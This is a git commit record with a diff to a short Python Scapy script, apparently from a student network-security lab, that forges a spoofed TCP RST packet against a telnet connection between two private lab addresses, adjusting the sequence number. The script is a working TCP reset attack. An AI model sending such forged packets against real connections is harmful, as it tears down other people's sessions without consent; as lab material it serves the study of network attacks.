ffb9d975b8dab7f5ebe8b58f834009b5702cef96
Ethan Harris <576552241qwj@gmail.com>
2021-12-05 22:00:25 +0800

    main

--- Task2.py
+++ Task2.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from scapy.all import *
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=59568, dport=23, flags="R", seq=4015531776)
+tcp = TCP(sport=59568, dport=23, flags="R", seq=4015531775)
 pkt = ip/tcp
 ls(pkt)
 send(pkt, verbose=0)
